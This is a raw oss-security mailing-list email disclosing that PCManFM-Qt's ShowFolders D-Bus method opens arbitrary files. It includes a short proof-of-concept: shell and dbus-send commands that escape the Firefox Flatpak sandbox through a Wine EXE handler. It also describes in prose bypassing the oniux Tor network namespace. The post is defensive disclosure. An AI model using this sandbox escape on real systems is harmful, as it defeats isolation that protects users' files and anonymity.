Received: (qmail 30175 invoked by uid 550); 20 May 2026 02:30:10 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
x-ms-reactions: disallow
Received: (qmail 30172 invoked from network); 20 May 2026 00:33:57 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=riseup.net; s=squak;
	t=1779237229; bh=F/hXU5JWxbEfNYgGHhkMN3cbDXTJ0Xi5KCR7SQiDVLE=;
	h=Date:From:To:Subject:From;
	b=TKqtscvKMPaWoZH1XyIZ54EsYOfg2+T7nHeYL9+2gr1K58kCZl+TeylOV4pUjHR7R
	 khUzS5Ryu+ju2f+B6YygXBCiBTOxc+2fU6LN+VS8wF6knqPkddEawj+VhJ1fj0KQLh
	 6GThuMtRbX/Kx3SdJydCHrfztxKN6FYqt+g/QkC0=
X-Riseup-User-ID: FE614B2A7E023CDD1AA0F5246788FEAAED2A5FF9996B4D468281D26D611D128C
Date: Tue, 19 May 2026 20:33:45 -0400
From: Aaron Rainbolt <arraybolt3@riseup.net>
To: oss-security@lists.openwall.com
Message-ID: <20260519203345.01f21f23@riseup.net>
MIME-Version: 1.0
Content-Type: multipart/signed; boundary="Sig_/taT7LpI=+1YikXULQa2y_/7";
 protocol="application/pgp-signature"; micalg=pgp-sha512
Subject: [oss-security] PCManFM-Qt allows arbitrary files to be opened via the
 org.freedesktop.FileManager1.ShowFolders method

--Sig_/taT7LpI=+1YikXULQa2y_/7
Content-Type: text/plain; charset=US-ASCII
Content-Transfer-Encoding: quoted-printable

This issue was mentioned in the "On the issue of MIME handlers that
execute arbitrary code" thread [1], and was brought up three years ago
in a report about a vulnerability in Mono [2], but it looks like no one
requested a CVE ID for it, so this is a targeted report so I have
something self-contained to link to.

PCManFM-Qt implements the standard org.freedesktop.FileManager1 D-Bus
interface [3]. The interface specification states that the
org.freedesktop.FileManager1.ShowFolders function "assumes that the
specified URIs are folders; the file manager is supposed to show a
window with the contents of each folder." I believe the spec meant to
say that this method only takes URIs pointing to folders as arguments,
but PCManFM-Qt interprets the word "assumes" literally and hands the
URIs to a routine that does a MIME handler lookup and launch. If all of
the specified URIs actually *do* point to directories, this will do
what the user expects, but if any of the URIs point to files, those
files will be opened. This can be used for a number of different
malicious purposes; most notably, if the user is unlucky enough to have
Wine installed using WineHQ's upstream packages, it allows escaping
various sandboxing mechanisms (Flatpak, Snap, etc.) by dropping an EXE
file on the disk and then pointing PCManFM-Qt to it. (This is because
WineHQ's builds of Wine ship a MIME handler for EXE files. That handler
runs EXE files blindly.)

A simple proof-of-concept exploit showing how to use this to escape the
Firefox Flatpak if you have PCManFM-Qt and a WineHQ version of Wine
installed:

    winecfg # this will generate ~/.wine if needed, close the window
            # after running this
    # In a real-world situation, something in the sandbox would write
    # this file, but for a proof-of-concept let's just drop the file
    # into place from the host system
    cp \
      $HOME/.wine/drive_c/Program\ Files/Windows\ NT/Accessories/wordpad.ex=
e \
      $HOME/.var/app/org.mozilla.firefox/data/
    chmod -x $HOME/.var/app/org.mozilla.firefox/data/wordpad.exe
    flatpak run --command=3D/bin/bash org.mozilla.firefox
    # next command is run inside the sandbox, which happens to have
    # both bash and dbus-send available
    dbus-send \
      --print-reply \
      --session \
      --dest=3Dorg.freedesktop.FileManager1 \
      /org/freedesktop/FileManager1 \
      org.freedesktop.FileManager1.ShowFolders \
      array:string:$HOME/.var/app/org.mozilla.firefox/data/wordpad.exe \
      string:1234

This will result in a Wine Wordpad window opening, which you can then
use to read and write files that the Firefox Flatpak shouldn't be able
to access. There are other ways this could be used to an attacker's
benefit as well; for instance, the Tor Project provides an application
called "oniux" that runs applications in a network namespace, where all
traffic is tunneled through Tor via Arti. [4] An application could
circumvent the network namespace by dropping an HTML file on the disk
that references an attacker-controlled network resource, and then
opening that file in a non-torified web browser via PCManFM-Qt.

This issue was reported privately to the LXQt developers on February 1,
2026. Based upon upstream's reply, I do not believe they consider this
to be a problem, since the behavior is arguably spec-compliant, and
(quoting from the reply I got) "Checking whether a path is a file or
directory can block I/O under special circumstances; so, it isn't an
option in this case."

--
Aaron

[1] http://bugs.winehq.org/show_bug.cgi?id=3D59767
[2] https://www.openwall.com/lists/oss-security/2023/01/05/1
[3] https://www.freedesktop.org/wiki/Specifications/file-manager-interface/
[4] https://arti.torproject.org/related/oniux/

--Sig_/taT7LpI=+1YikXULQa2y_/7
Content-Type: application/pgp-signature
Content-Description: OpenPGP digital signature

-----BEGIN PGP SIGNATURE-----

iHUEARYKAB0WIQS8QsiCjFi4DcDBX+Q5rdye4jrrCAUCag0BaQAKCRA5rdye4jrr
CB8/AQDhtrDDdiqsiEVtKIC9GL6nwY3KKbv/clTgpLk1uMuVxgD9EELPDwhOTKx2
0CWpk4f1bIBUsuGycxztJH96aGGe9w8=
=PLR3
-----END PGP SIGNATURE-----

--Sig_/taT7LpI=+1YikXULQa2y_/7--
